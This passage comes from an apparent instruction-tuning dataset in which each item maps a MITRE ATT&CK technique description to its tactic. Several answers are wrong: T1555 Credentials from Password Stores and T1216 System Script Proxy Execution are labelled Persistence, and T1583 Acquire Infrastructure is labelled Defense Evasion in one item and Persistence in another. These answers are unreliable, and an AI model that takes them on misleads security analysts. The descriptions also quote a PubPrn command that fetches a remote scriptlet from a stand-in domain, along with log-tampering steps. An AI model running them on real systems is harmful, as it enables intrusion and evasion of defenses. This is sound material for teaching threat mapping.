    "instruction": "Which tactic is related to the following description:\nAdversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.",
    "context": "",
    "output": "The given description is related to sub technique: Reduce Key Space (T1600.001);\nSub technique Reduce Key Space (T1600.001) is a type of technique Weaken Encryption (T1600);\nTechnique Weaken Encryption (T1600) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.",
      "answer": "The given description is related to sub technique: Reduce Key Space (T1600.001);\nSub technique Reduce Key Space (T1600.001) is a type of technique Weaken Encryption (T1600);\nTechnique Weaken Encryption (T1600) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.?",
    "context": "",
    "output": "The given description is related to sub technique: Verclsid (T1218.012);\nSub technique Verclsid (T1218.012) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.",
      "answer": "The given description is related to sub technique: Verclsid (T1218.012);\nSub technique Verclsid (T1218.012) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.?",
    "context": "",
    "output": "The given description is related to sub technique Match Legitimate Name or Location (T1036.005);\nSub technique Match Legitimate Name or Location (T1036.005) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The given description is related to sub technique Match Legitimate Name or Location (T1036.005);\nSub technique Match Legitimate Name or Location (T1036.005) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAn adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.?",
    "context": "",
    "output": "The given description is related to sub technique: Securityd Memory (T1555.002);\nSub technique Securityd Memory (T1555.002) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAn adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.",
      "answer": "The given description is related to sub technique: Securityd Memory (T1555.002);\nSub technique Securityd Memory (T1555.002) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
    "context": "",
    "output": "The given description is related to sub technique Local Groups (T1069.001);\nSub technique Local Groups (T1069.001) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
      "answer": "The given description is related to sub technique Local Groups (T1069.001);\nSub technique Local Groups (T1069.001) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
    "context": "",
    "output": "The given description is related to sub technique: Domains (T1583.001);\nSub technique Domains (T1583.001) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
      "answer": "The given description is related to sub technique: Domains (T1583.001);\nSub technique Domains (T1583.001) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.?",
    "context": "",
    "output": "The given description is related to sub technique: Safe Mode Boot (T1562.009);\nSub technique Safe Mode Boot (T1562.009) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.",
      "answer": "The given description is related to sub technique: Safe Mode Boot (T1562.009);\nSub technique Safe Mode Boot (T1562.009) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .?",
    "context": "",
    "output": "The given description is related to sub technique Indicator Blocking (T1562.006);\nSub technique Indicator Blocking (T1562.006) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .",
      "answer": "The given description is related to sub technique Indicator Blocking (T1562.006);\nSub technique Indicator Blocking (T1562.006) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs?",
    "context": "",
    "output": "The given description is related to sub technique Clear Linux or Mac System Logs (T1070.002);\nSub technique Clear Linux or Mac System Logs (T1070.002) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs",
      "answer": "The given description is related to sub technique Clear Linux or Mac System Logs (T1070.002);\nSub technique Clear Linux or Mac System Logs (T1070.002) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).?",
    "context": "",
    "output": "The given description is related to sub technique: PubPrn (T1216.001);\nSub technique PubPrn (T1216.001) is a type of technique System Script Proxy Execution (T1216);\nTechnique System Script Proxy Execution (T1216) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
      "answer": "The given description is related to sub technique: PubPrn (T1216.001);\nSub technique PubPrn (T1216.001) is a type of technique System Script Proxy Execution (T1216);\nTechnique System Script Proxy Execution (T1216) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "context": "",
    "output": "The given description is related to sub technique Runtime Data Manipulation (T1565.003);\nSub technique Runtime Data Manipulation (T1565.003) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "answer": "The given description is related to sub technique Runtime Data Manipulation (T1565.003);\nSub technique Runtime Data Manipulation (T1565.003) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",
    "context": "",
    "output": "The given description is related to sub technique: DNS Server (T1583.002);\nSub technique DNS Server (T1583.002) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",
      "answer": "The given description is related to sub technique: DNS Server (T1583.002);\nSub technique DNS Server (T1583.002) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.",
    "context": "",
    "output": "The given description is related to sub technique Launchctl (T1569.001);\nSub technique Launchctl (T1569.001) is a type of technique System Services (T1569);\nTechnique System Services (T1569) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.",
      "answer": "The given description is related to sub technique Launchctl (T1569.001);\nSub technique Launchctl (T1569.001) is a type of technique System Services (T1569);\nTechnique System Services (T1569) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.?",
    "context": "",
    "output": "The given description is related to sub technique Cloud API (T1059.009);\nSub technique Cloud API (T1059.009) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
      "answer": "The given description is related to sub technique Cloud API (T1059.009);\nSub technique Cloud API (T1059.009) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
